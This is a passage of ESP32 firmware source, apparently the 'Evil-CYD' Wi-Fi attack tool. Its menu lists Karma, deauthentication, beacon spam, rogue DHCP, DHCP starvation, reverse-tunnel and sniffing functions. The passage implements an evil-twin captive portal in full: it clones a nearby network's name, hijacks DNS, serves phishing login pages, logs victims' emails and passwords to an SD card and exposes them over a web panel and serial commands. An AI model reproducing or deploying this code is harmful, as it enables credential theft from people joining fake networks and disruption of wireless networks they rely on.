    tft.print("C:" + String(WiFi.localIP().toString() != "0.0.0.0" ? "On" : "Off") + " ");

    // Indicateur de point clignotant pour les accès aux pages et DNS
    static bool dotState = false;
    dotState = !dotState;
    tft.setCursor(130, 2);

    if (pageAccessFlag) {
      tft.print("" + String(dotState ? "■" : " "));
      pixels.setPixelColor(0, pixels.Color(0, 255, 0));
      pixels.show();
      delay(100);
      pixels.setPixelColor(0, pixels.Color(0, 0, 0));
      pixels.show();
      pageAccessFlag = false;
    } else {
      tft.print("  ");
    }
  }
  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
}


bool isTouched() {
  TouchPoint touch = ts.getTouch();
  return touch.zRaw != 0;
}


void screenDebounce() {
  TouchPoint touch;
  do {
    touch = ts.getTouch();
    delay(10);
  } while (touch.zRaw != 0);
}

void loop() {
  handleDnsRequestSerial();
  unsigned long currentMillis = millis();

  // Mettre à jour la barre de tâches indépendamment du menu
  if (currentMillis - lastTaskBarUpdateTime >= taskBarUpdateInterval && inMenu) {
    drawTaskBar();
    lastTaskBarUpdateTime = currentMillis;
  }

  TouchPoint touch = ts.getTouch(); // Détecter le toucher
  bool isTouchDetected = touch.zRaw != 0; // Vérifier si l'écran est touché

  if (inMenu) {
    if (lastIndex != currentIndex) {
      drawMenu();
      lastIndex = currentIndex;
    }
    handleMenuInput();
  } else {
    switch (currentStateKarma) {
      case StartScanKarma:
        if (isTouchDetected && touch.yRaw > (tft.height() / 2)) { // Détecte un toucher dans la moitié inférieure pour démarrer le scan
          startScanKarma();
          currentStateKarma = ScanningKarma;
        }
        break;

      case ScanningKarma:
        if (isTouchDetected && touch.yRaw > (tft.height() / 2)) { // Détecte un toucher dans la moitié inférieure pour activer le mode Karma
          isKarmaMode = true;
          stopScanKarma();
          currentStateKarma = ssid_count_Karma > 0 ? StopScanKarma : StartScanKarma;
        }
        break;

      case StopScanKarma:
        handleMenuInputKarma();
        break;

      case SelectSSIDKarma:
        handleMenuInputKarma();
        break;
    }
  }
}




void executeMenuItem(int index) {
  inMenu = false;
  isOperationInProgress = true;
  switch (index) {
    case 0:
      scanWifiNetworks();
      break;
    case 1:
      showWifiList();
      break;
    case 2:
      showWifiDetails(currentListIndex);
      break;
    case 3:
      setWifiSSID();
      break;
    case 4:
      setWifiPassword();
      break;
    case 5:
      setMacAddress();
      break;
    case 6:
      createCaptivePortal();
      break;
    case 7:
      stopCaptivePortal();
      break;
    case 8:
      changePortal(portalFileIndex);
      break;
    case 9:
      checkCredentials();
      break;
    case 10:
      deleteCredentials();
      break;
    case 11:
      displayMonitorPage1();
      break;
    case 12:
      probeAttack();
      break;
    case 13:
      probeSniffing();
      break;
    case 14:
      karmaAttack();
      break;
    case 15:
      startAutoKarma();
      break;
    case 16:
      karmaSpear();
      break;
    case 17:
      listProbes();
      break;
    case 18:
      deleteProbe();
      break;
    case 19:
      deleteAllProbes();
      break;
    case 20:
      wardrivingMode();
      break;
    case 21:
      startWardivingMaster();
      break;
    case 22:
      beaconAttack();
      break;
    case 23:
      deauthAttack(currentListIndex);
      break;
    case 24:
      sniffMaster();
      break;
    case 25:
      allTrafficSniffer();
      break;
    case 26:
      sniffNetwork();
      break;
    case 27:
      wifiVisualizer();
      break;
    case 28:
      deauthClients();
      break;
    case 29:
      deauthDetect();
      break;
    case 30:
      checkHandshakes();
      break;
    case 31:
      wallOfFlipper();
      break;
    case 32:
      connectWifi(currentListIndex);
      break;
    case 33:
      send_pwnagotchi_beacon_main();
      break;
    case 34:
      skimmerDetection();
      break;
    case 35:
      reverseTCPTunnel();
      break;
    case 36:
      startDHCPStarvation();
      break;
    case 37:
      rogueDHCP();
      break;
    case 38:
      switchDNS();
      break;
    case 39:
      DHCPAttackAuto();
      break;
    case 40:
      detectPrinter();
      break;
    case 41:
      printFile();
      break;
    case 42:
      checkPrinterStatus();
      break;
    case 43:
      showSettingsMenu();
  }
  isOperationInProgress = false;
}

void handleMenuInput() {
  static bool isTouchHandled = false;
  int largeurZone = tft.width() / 3;
  screenDebounce();

  TouchPoint touch = ts.getTouch();
  if (touch.zRaw != 0) {
    if (!isTouchHandled) {
      // Map the touch coordinates to screen coordinates
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      // Zone gauche
      if (x < largeurZone) {
        currentIndex--;
        if (currentIndex < 0) {
          currentIndex = menuSize - 1;
          if (menuSize > maxMenuDisplay)
            menuStartIndex = menuSize - maxMenuDisplay;
          else
            menuStartIndex = 0;
        } else if (currentIndex < menuStartIndex) {
          menuStartIndex = currentIndex;
        }
        isTouchHandled = true;
      }
      // Zone droite
      else if (x >= 2 * largeurZone) {
        currentIndex++;
        if (currentIndex >= menuSize) {
          currentIndex = 0;
          menuStartIndex = 0;
        } else if (currentIndex >= menuStartIndex + maxMenuDisplay) {
          menuStartIndex = currentIndex - maxMenuDisplay + 1;
        }
        isTouchHandled = true;
      }
      // Zone centrale
      else if (x >= largeurZone && x < 2 * largeurZone) {
        executeMenuItem(currentIndex);
        isTouchHandled = true;
      }
    }
  } else {
    isTouchHandled = false;
  }

  // Ensure menuStartIndex remains within valid bounds
  if (menuStartIndex < 0)
    menuStartIndex = 0;
  if (menuSize <= maxMenuDisplay)
    menuStartIndex = 0;
  else if (menuStartIndex > menuSize - maxMenuDisplay)
    menuStartIndex = menuSize - maxMenuDisplay;
}




void drawMenu() {
  drawTaskBarBackground(); // Redessiner l'arrière-plan de la barre des tâches
  drawTaskBar();           // Mettre à jour le contenu de la barre des tâches

  // Effacer la partie inférieure de l'écran
  tft.fillRect(0, 20, tft.width(), tft.height() - 13, menuBackgroundColor);
  tft.setTextSize(2);
  tft.setTextFont(1);

  int lineHeight = 22;
  int startX = 5;
  int startY = 20;

  for (int i = 0; i < maxMenuDisplay; i++) {
    int menuIndex = menuStartIndex + i;
    if (menuIndex >= menuSize) break;

    if (menuIndex == currentIndex) {
      tft.fillRect(0, startY + i * lineHeight, tft.width(), lineHeight, menuSelectedBackgroundColor);
      tft.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
    } else {
      tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor); // Définir la couleur de fond
    }
    tft.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
    tft.println(menuItems[menuIndex]);
  }

  tft.setTextColor(TFT_DARKGREY, menuBackgroundColor); // Pour les boutons
  tft.setCursor(58, 220);
  tft.println("Up");
  tft.setCursor(130, 220);
  tft.println("Select");
  tft.setCursor(233, 220);
  tft.println("Down");
  tft.setTextColor(TFT_WHITE, menuBackgroundColor);
}



void handleDnsRequestSerial() {
  dnsServer.processNextRequest();
  server.handleClient();
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    checkSerialCommands();
  }
}

String currentlySelectedSSID = "";
bool isProbeAttackRunning = false;
bool stopProbeSniffingViaSerial = false;
bool isProbeSniffingRunning = false;

void checkSerialCommands() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    if (command == "scan_wifi") {
      isOperationInProgress = true;
      inMenu = false;
      scanWifiNetworks();
      for (int i = 0; i < numSsid; i++) {
        ssidList[i] = WiFi.SSID(i);
      }
    } else if (command.startsWith("select_network")) {
      int ssidIndex = command.substring(String("select_network ").length()).toInt();
      selectNetwork(ssidIndex);
    } else if (command.startsWith("change_ssid ")) {
      String newSSID = command.substring(String("change_ssid ").length());
      cloneSSIDForCaptivePortal(newSSID);
    } else if (command.startsWith("set_portal_password ")) {
      String newPassword = command.substring(String("set_portal_password ").length());
      captivePortalPassword = newPassword;
    } else if (command.startsWith("set_portal_open")) {
      captivePortalPassword = "";
    } else if (command.startsWith("detail_ssid")) {
      int ssidIndex = command.substring(String("detail_ssid ").length()).toInt();
      String security = getWifiSecurity(ssidIndex);
      int32_t rssi = WiFi.RSSI(ssidIndex);
      uint8_t* bssid = WiFi.BSSID(ssidIndex);
      String macAddress = bssidToString(bssid);
      ////
    } else if (command == "clone_ssid") {
      cloneSSIDForCaptivePortal(currentlySelectedSSID);
    } else if (command == "start_portal") {
      createCaptivePortal();
    } else if (command == "stop_portal") {
      stopCaptivePortal();
    } else if (command == "list_portal") {
      File root = SD.open("/sites");
      numPortalFiles = 0;
      while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
          String fileName = file.name();
          if (fileName.endsWith(".html")) {
            portalFiles[numPortalFiles] = String("/sites/") + fileName;
            numPortalFiles++;
            if (numPortalFiles >= 30) break;
          }
        }
        file.close();
      }
      root.close();
    } else if (command.startsWith("change_portal")) {
      int portalIndex = command.substring(String("change_portal ").length()).toInt();
      changePortal(portalIndex);
    } else if (command == "check_credentials") {
      checkCredentialsSerial();
    } else if (command == "help") {
      Serial.println("-------------------");
      Serial.println("Available Commands:");
      Serial.println("scan_wifi - Scan WiFi Networks");
      Serial.println("select_network <index> - Select WiFi <index>");
      Serial.println("change_ssid <max 32 char> - change current SSID");
      Serial.println("set_portal_password <password min 8> - change portal password");
      Serial.println("set_portal_open  - change portal to open");
      Serial.println("detail_ssid <index> - Details of WiFi <index>");
      Serial.println("clone_ssid - Clone Network SSID");
      Serial.println("start_portal - Activate Captive Portal");
      Serial.println("stop_portal - Deactivate Portal");
      Serial.println("list_portal - Show Portal List");
      Serial.println("change_portal <index> - Switch Portal <index>");
      Serial.println("check_credentials - Check Saved Credentials");
      Serial.println("-------------------");
    } else {
      Serial.println("-------------------");
      Serial.println("Command not recognized: " + command);
      Serial.println("-------------------");
    }
  }
}


void checkCredentialsSerial() {
  File file = SD.open("/credentials.txt");
  if (!file) {
    Serial.println("Failed to open credentials file");
    return;
  }
  bool isEmpty = true;
  Serial.println("----------------------");
  Serial.println("Credentials Found:");
  Serial.println("----------------------");
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.length() > 0) {
      Serial.println(line);
      //sendBLE(line);
      isEmpty = false;
    }
  }
  file.close();
  if (isEmpty) {
    Serial.println("No credentials found.");
    //sendBLE("No credentials found.");
  }
}

void changePortal(int index) {
  listPortalFiles();
  const int listDisplayLimit = tft.height() / 18;
  bool needDisplayUpdate = true;
  static bool isTouchHandled = false;

  // Wait for touch release before starting
  screenDebounce();

  while (!inMenu) {
    if (needDisplayUpdate) {
      int listStartIndex = max(0, min(portalFileIndex, numPortalFiles - listDisplayLimit));

      tft.fillScreen(TFT_BLACK);
      tft.setTextSize(2);
      tft.setTextColor(menuTextUnFocusedColor);
      tft.setCursor(10, 10);

      for (int i = listStartIndex; i < min(numPortalFiles, listStartIndex + listDisplayLimit); i++) {
        if (i == portalFileIndex) {
          tft.fillRect(0, (i - listStartIndex) * 18, tft.width(), 18, menuSelectedBackgroundColor);
          tft.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
        } else {
          tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        }
        tft.setCursor(10, (i - listStartIndex) * 18);
        tft.println(portalFiles[i].substring(7));
      }
      needDisplayUpdate = false;
    }

    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      if (!isTouchHandled) {
        int x = map(touch.xRaw, minX, maxX, 0, tft.width());

        int largeurZone = tft.width() / 3;

        // Zone gauche pour naviguer vers le haut
        if (x < largeurZone) {
          portalFileIndex = (portalFileIndex - 1 + numPortalFiles) % numPortalFiles;
          needDisplayUpdate = true;
        }
        // Zone droite pour naviguer vers le bas
        else if (x >= 2 * largeurZone) {
          portalFileIndex = (portalFileIndex + 1) % numPortalFiles;
          needDisplayUpdate = true;
        }
        // Zone centrale pour sélectionner le fichier
        else if (x >= largeurZone && x < 2 * largeurZone) {
          selectedPortalFile = portalFiles[portalFileIndex];
          inMenu = true;
          Serial.println("-------------------");
          Serial.println(selectedPortalFile.substring(7) + " portal selected.");
          Serial.println("-------------------");
          waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected");
          isTouchHandled = true;
          break;
        }
        isTouchHandled = true;
      }
    } else {
      isTouchHandled = false;
    }
  }
}



void selectNetwork(int index) {
  if (index >= 0 && index < numSsid) {
    currentlySelectedSSID = ssidList[index];
    Serial.println("SSID sélectionné: " + currentlySelectedSSID);
  } else {
    Serial.println("Index SSID invalide.");
  }
}

void scanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 5000) {
    tft.fillScreen(TFT_BLACK);
    tft.fillRect(0, tft.height() - 20, tft.width(), 20, TFT_BLACK);
    tft.setCursor(50 , tft.height() / 2 );
    tft.print("Scan in progress... ");
    Serial.println("-------------------");
    Serial.println("WiFi Scan in progress... ");
    //
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }
  Serial.println("-------------------");
  Serial.println("Near Wifi Network : ");
  numSsid = min(n, 100);
  for (int i = 0; i < numSsid; i++) {
    ssidList[i] = WiFi.SSID(i);
    Serial.print(i);
    Serial.print(": ");
    Serial.println(ssidList[i]);
  }
  Serial.println("-------------------");
  Serial.println("WiFi Scan Completed ");
  Serial.println("-------------------");
  waitAndReturnToMenu("Scan Completed");

}


void showWifiList() {
  const int listDisplayLimit = tft.height() / 18;
  int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));
  static bool isTouchHandled = false;
  screenDebounce();

  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit); i++) {
    if (i == currentListIndex) {
      tft.fillRect(0, (i - listStartIndex) * 18, tft.width(), 18, menuSelectedBackgroundColor);
      tft.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
    } else {
      tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    }
    tft.setCursor(10, (i - listStartIndex) * 18);
    tft.println(ssidList[i]);
  }

  while (!inMenu) {
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      if (!isTouchHandled) {
        // Map the touch coordinates
        int x = map(touch.xRaw, minX, maxX, 0, tft.width());
        int y = map(touch.yRaw, minY, maxY, 0, tft.height());

        int largeurZone = tft.width() / 3;

        // Zone gauche pour monter dans la liste
        if (x < largeurZone) {
          currentListIndex--;
          if (currentListIndex < 0) currentListIndex = numSsid - 1;
          isTouchHandled = true;
          showWifiList();
        }
        // Zone droite pour descendre dans la liste
        else if (x >= 2 * largeurZone) {
          currentListIndex++;
          if (currentListIndex >= numSsid) currentListIndex = 0;
          isTouchHandled = true;
          showWifiList();
        }
        // Zone centrale pour sélectionner un SSID
        else if (x >= largeurZone && x < 2 * largeurZone) {
          inMenu = true;
          Serial.println("-------------------");
          Serial.println("SSID " + ssidList[currentListIndex] + " selected");
          Serial.println("-------------------");
          waitAndReturnToMenu(ssidList[currentListIndex] + "\n      selected");
          isTouchHandled = true;
        }
      }
    } else {
      isTouchHandled = false;
    }

    handleDnsRequestSerial();
  }
}


void showWifiDetails(int &networkIndex) {
  inMenu = false;
  static bool isTouchHandled = false;

  auto updateDisplay = [&]() {
    if (networkIndex >= 0 && networkIndex < numSsid) {
      tft.fillScreen(TFT_BLACK);
      tft.setTextSize(2);
      int y = 10;

      tft.setCursor(10, y);
      tft.println("SSID: " + (ssidList[networkIndex].length() > 0 ? ssidList[networkIndex] : "N/A"));
      y += 30;

      int channel = WiFi.channel(networkIndex);
      tft.setCursor(10, y);
      tft.println("Channel: " + (channel > 0 ? String(channel) : "N/A"));
      y += 20;

      String security = getWifiSecurity(networkIndex);
      tft.setCursor(10, y);
      tft.println("Security: " + (security.length() > 0 ? security : "N/A"));
      y += 20;

      int32_t rssi = WiFi.RSSI(networkIndex);
      tft.setCursor(10, y);
      tft.println("Signal: " + (rssi != 0 ? String(rssi) + " dBm" : "N/A"));
      y += 20;

      uint8_t* bssid = WiFi.BSSID(networkIndex);
      String macAddress = bssidToString(bssid);
      tft.setCursor(10, y);
      tft.println("MAC: " + (macAddress.length() > 0 ? macAddress : "N/A"));
      y += 20;

      tft.setCursor(35, 220);
      tft.println("Next");
      tft.setCursor(140, 220);
      tft.println("Back");
      tft.setCursor(238, 220);
      tft.println("Clone");
    }
  };

  updateDisplay();
  screenDebounce();

  while (!inMenu) {
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      if (!isTouchHandled) {
        int x = map(touch.xRaw, minX, maxX, 0, tft.width());

        int largeurZone = tft.width() / 3;

        // Zone gauche pour le prochain réseau
        if (x < largeurZone) {
          networkIndex = (networkIndex + 1) % numSsid;
          updateDisplay();
          isTouchHandled = true;
        }
        // Zone droite pour le clonage du réseau
        else if (x >= 2 * largeurZone) {
          cloneSSIDForCaptivePortal(ssidList[networkIndex]);
          inMenu = true;
          waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
          Serial.println(ssidList[networkIndex] + " Cloned...");
          drawMenu();
          isTouchHandled = true;
        }
        // Zone centrale pour retourner au menu
        else if (x >= largeurZone && x < 2 * largeurZone) {
          inMenu = true;
          drawMenu();
          isTouchHandled = true;
          break;
        }
      }

    } else {
      isTouchHandled = false;
      screenDebounce();
    }
  }
}







String getWifiSecurity(int networkIndex) {
  switch (WiFi.encryptionType(networkIndex)) {
    case WIFI_AUTH_OPEN:
      return "Open";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA_WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
    default:
      return "Unknown";
  }
}

String bssidToString(uint8_t* bssid) {
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(mac);
}

void cloneSSIDForCaptivePortal(String ssid) {
  clonedSSID = ssid;
}

// Global variables specific to save-file function
File saveFileObject;             // File object for saving
bool isSaveFileAuthorized = false; // Authorization flag for saving file

void createCaptivePortal() {
  String ssid = clonedSSID.isEmpty() ? "Evil-CYD" : clonedSSID;
  WiFi.mode(WIFI_MODE_APSTA);
  if (!isAutoKarmaActive) {
    if (captivePortalPassword == "") {
      WiFi.softAP(clonedSSID.c_str());
    } else {
      WiFi.softAP(clonedSSID.c_str(), captivePortalPassword.c_str());
    }

  }

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  isCaptivePortalOn = true;
  server.on("/", HTTP_GET, []() {
    String email = server.arg("email");
    String password = server.arg("password");
    if (!email.isEmpty() && !password.isEmpty()) {
      saveCredentials(email, password, selectedPortalFile.substring(7), clonedSSID); // Assurez-vous d'utiliser les bons noms de variables
      server.send(200, "text/plain", "Credentials Saved");
    } else {
      Serial.println("-------------------");
      Serial.println("Direct Web Access !!!");
      Serial.println("-------------------");
      servePortalFile(selectedPortalFile);
    }
  });



  server.on("/evil-m5core2-menu", HTTP_GET, []() {
    String html = "<!DOCTYPE html><html><head><style>";
    html += "body{font-family:sans-serif;background:#f0f0f0;padding:40px;display:flex;justify-content:center;align-items:center;height:100vh}";
    html += "form{text-align:center;}div.menu{background:white;padding:20px;box-shadow:0 4px 8px rgba(0,0,0,0.1);border-radius:10px}";
    html += "input,a{margin:10px;padding:8px;width:80%;box-sizing:border-box;border:1px solid #ddd;border-radius:5px}";
    html += "a{display:inline-block;text-decoration:none;color:white;background:#007bff;text-align:center}";
    html += "</style></head><body>";
    html += "<div class='menu'><form action='/evil-m5core2-menu' method='get'>";
    html += "Password: <input type='password' name='pass'><br>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/credentials?pass=\"+document.getElementsByName(\"pass\")[0].value'>Credentials</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On SD</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/check-sd-file?pass=\"+document.getElementsByName(\"pass\")[0].value'>Check SD File</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/setup-portal?pass=\"+document.getElementsByName(\"pass\")[0].value'>Setup Portal</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/monitor-status?pass=\"+document.getElementsByName(\"pass\")[0].value'>Monitor Status</a>";  // Lien vers Monitor Status
    html += "</form></div></body></html>";

    server.send(200, "text/html", html);
    Serial.println("-------------------");
    Serial.println("evil-m5core2-menu access.");
    Serial.println("-------------------");
  });



  server.on("/credentials", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password == accessWebPassword) {
      File file = SD.open("/credentials.txt");
      if (file) {
        if (file.size() == 0) {
          server.send(200, "text/html", "<html><body><p>No credentials...</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
        } else {
          server.streamFile(file, "text/plain");
        }
        file.close();
      } else {
        server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      }
    } else {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    }
  });


  server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
  server.on("/download-sd-file", HTTP_GET, handleFileDownload);
  server.on("/download-all-files", HTTP_GET, handleDownloadAllFiles);
  server.on("/list-directories", HTTP_GET, handleListDirectories);

  server.on("/uploadhtmlfile", HTTP_GET, []() {
    if (server.arg("pass") == accessWebPassword) {
      String password = server.arg("pass");
      String html = "<!DOCTYPE html><html><head>";
      html += "<meta charset='UTF-8'>";
      html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
      html += "<title>Upload File</title></head>";
      html += "<body><div class='container'>";
      html += "<form id='uploadForm' method='post' enctype='multipart/form-data'>";
      html += "<input type='file' name='file' accept='*/*'>";
      html += "Select directory: <select id='dirSelect' name='directory'>";
      html += "<option value='/'>/</option>";
      html += "</select><br>";
      html += "<input type='submit' value='Upload file'>";
      html += "</form>";
      html += "<script>";
      html += "window.onload = function() {";
      html += "    var passValue = '" + password + "';";
      html += "    var dirSelect = document.getElementById('dirSelect');";
      html += "    fetch('/list-directories?pass=' + encodeURIComponent(passValue))";
      html += "        .then(response => response.text())";
      html += "        .then(data => {";
      html += "            const dirs = data.split('\\n');";
      html += "            dirs.forEach(dir => {";
      html += "                if (dir.trim() !== '') {";
      html += "                    var option = document.createElement('option');";
      html += "                    option.value = dir;";
      html += "                    option.textContent = dir;";
      html += "                    dirSelect.appendChild(option);";
      html += "                }";
      html += "            });";
      html += "        })";
      html += "        .catch(error => console.error('Error:', error));";
      html += "    var form = document.getElementById('uploadForm');";
      html += "    form.onsubmit = function(event) {";
      html += "        event.preventDefault();";
      html += "        var directory = dirSelect.value;";
      html += "        form.action = '/upload?pass=' + encodeURIComponent(passValue) + '&directory=' + encodeURIComponent(directory);";
      html += "        form.submit();";
      html += "    };";
      html += "};";
      html += "</script>";
      html += "<style>";
      html += "body,html{height:100%;margin:0;display:flex;justify-content:center;align-items:center;background-color:#f5f5f5}select {padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ddd; width: 92%; background-color: #fff; color: #333;}.container{width:50%;max-width:400px;min-width:300px;padding:20px;background:#fff;box-shadow:0 4px 8px rgba(0,0,0,.1);border-radius:10px;display:flex;flex-direction:column;align-items:center}form{width:100%}input[type=file],input[type=submit]{width:92%;padding:10px;margin-bottom:10px;border-radius:5px;border:1px solid #ddd}input[type=submit]{background-color:#007bff;color:#fff;cursor:pointer;width:100%}input[type=submit]:hover{background-color:#0056b3}@media (max-width:600px){.container{width:80%;min-width:0}}";
      html += "</style></body></html>";

      server.send(200, "text/html", html);
    } else {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    }
  });



  server.on("/upload", HTTP_POST, []() {
    server.send(200);
  }, handleFileUpload);

  server.on("/delete-sd-file", HTTP_GET, handleFileDelete);

  server.on("/setup-portal", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    // Lister les fichiers HTML disponibles dans le dossier /sites avec un indice
    String portalOptions = "";
    File root = SD.open("/sites");
    int index = 0;  // Initialiser un indice pour chaque fichier

    while (File file = root.openNextFile()) {
      if (!file.isDirectory() && String(file.name()).endsWith(".html")) {
        // Ajouter l'indice comme valeur pour chaque option
        portalOptions += "<option value='" + String(index) + "'>" + file.name() + "</option>";
        index++;
      }
      file.close();
    }
    root.close();

    // Génération de la page HTML avec la liste déroulante pour choisir le fichier de portail
    String html = "<html><head><style>";
    html += "body { background-color: #333; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }";
    html += ".container { display: inline-block; background-color: #444; padding: 30px; border-radius: 8px; box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.3); width: 320px; }";
    html += "input[type='text'], input[type='password'], select, button { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; box-sizing: border-box; font-size: 16px; background-color: #FFF; color: #333; }";
    html += "button, input[type='submit'] { background-color: #008CBA; color: white; cursor: pointer; border-radius: 25px; transition: background-color 0.3s ease; }";
    html += "button:hover, input[type='submit']:hover { background-color: #005F73; }";
    html += "</style></head><body>";

    html += "<div class='container'>";
    html += "<form action='/update-portal-settings' method='get'>";
    html += "<input type='hidden' name='pass' value='" + password + "'>";
    html += "<h2 style='color: #FFF;'>Setup Portal</h2>";
    html += "Portal Name: <br><input type='text' name='newSSID' placeholder='Enter new SSID'><br>";
    html += "New Password (leave empty for open network): <br><input type='password' name='newPassword' placeholder='Enter new Password'><br>";

    // Ajout de la liste déroulante pour sélectionner le fichier de portail par indice
    html += "Select Portal Page: <br><select name='portalIndex'>";
    html += portalOptions;
    html += "</select><br>";

    html += "<input type='submit' value='Save Settings'><br>";
    html += "</form>";

    html += "<div class='button-group'>";
    html += "<a href='/start-portal?pass=" + password + "'><button type='button'>Start Portal</button></a>";
    html += "<a href='/stop-portal?pass=" + password + "'><button type='button'>Stop Portal</button></a>";
    html += "</div>";
    html += "</div></body></html>";

    server.send(200, "text/html", html);
  });






  server.on("/update-portal-settings", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    String newSSID = server.arg("newSSID");
    String newPassword = server.arg("newPassword");
    int portalIndex = server.arg("portalIndex").toInt();  // Récupérer l'indice du fichier sélectionné

    // Logs pour vérifier l'indice reçu
    Serial.println("Updating portal settings...");
    Serial.println("New SSID: " + newSSID);
    Serial.println("New Password: " + newPassword);
    Serial.println("Selected Portal Index: " + String(portalIndex));

    // Mettre à jour le SSID
    if (!newSSID.isEmpty()) {
      cloneSSIDForCaptivePortal(newSSID);
      Serial.println("Portal Name updated: " + newSSID);
    }

    // Mettre à jour le mot de passe
    if (!newPassword.isEmpty()) {
      captivePortalPassword = newPassword;
      Serial.println("Portal Password updated: " + newPassword);
    } else {
      captivePortalPassword = "";  // Réseau ouvert
      Serial.println("Portal is now open (no password).");
    }

    // Appeler `changePortal` avec l'indice
    changePortal(portalIndex);
    Serial.println("Portal page updated to index: " + String(portalIndex));

    server.send(200, "text/html", "<html><body><p>Settings updated successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  });





  server.on("/start-portal", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    createCaptivePortal();  // Démarrer le portail
    server.send(200, "text/html", "<html><body><p>Portal started successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  });

  server.on("/stop-portal", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    stopCaptivePortal();  // Arrêter le portail
    server.send(200, "text/html", "<html><body><p>Portal stopped successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  });



  server.on("/edit-file", HTTP_GET, []() {
    String editFilePassword = server.arg("pass");
    if (editFilePassword != accessWebPassword) {
      Serial.println("Unauthorized access attempt to /edit-file");
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    String editFileName = server.arg("filename");
    if (!editFileName.startsWith("/")) {
      editFileName = "/" + editFileName;
    }

    // Check if the file exists
    if (!SD.exists(editFileName)) {
      Serial.println("File not found: " + editFileName);
      server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    // Open the file for reading
    File editFile = SD.open(editFileName, FILE_READ);
    if (!editFile) {
      Serial.println("Failed to open file for reading: " + editFileName);
      server.send(500, "text/html", "<html><body><p>Failed to open file for reading.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    Serial.println("File opened successfully: " + editFileName);

    // Send HTML header with UTF-8 encoding
    String htmlContent = "<!DOCTYPE html><html><head><meta charset='UTF-8'><style>";
    htmlContent += "textarea { width: 100%; height: 400px; }";
    htmlContent += "button { background-color: #007bff; border: none; color: white; padding: 10px; font-size: 16px; cursor: pointer; margin-top: 10px; }";
    htmlContent += "</style></head><body>";
    htmlContent += "<h3>Editing File: " + editFileName + "</h3>";
    htmlContent += "<form id='editForm' method='post' enctype='multipart/form-data'>";
